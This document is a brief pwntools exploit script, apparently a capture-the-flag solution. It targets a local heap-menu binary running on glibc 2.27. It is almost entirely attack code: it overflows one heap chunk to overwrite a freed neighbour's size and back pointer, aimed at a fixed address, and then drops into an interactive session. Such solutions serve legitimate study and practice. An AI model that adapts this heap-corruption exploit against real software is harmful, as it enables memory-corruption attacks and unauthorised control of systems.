#!/usr/bin/python3

from pwn import *

r = process('./M', env={"LD_PRELOAD": "./libc-2.27.so"})

def choice(i):
    r.sendafter('our choice :', str(i))

def add(size, c):
    choice(1)
    r.sendafter('Size', str(size))
    r.sendafter('Content', c)

def edit(idx, size, c):
    choice(2)
    r.sendafter('Index', str(idx))
    r.sendafter('Size', str(size))
    r.sendafter('Content', c)

def remove(idx):
    choice(3)
    r.sendafter('Index', str(idx))

magic = 0x4040a0

add(0x420, 'A'*0x8)
add(0x420, 'B'*0x8)
add(0x420, 'C'*0x8)
remove(1)
edit(0, 0x440, b'A'*0x420 + p64(0) + p64(0x431) + p64(0) + p64(magic - 0x10))
add(0x420, 'D'*0x8)

r.interactive()
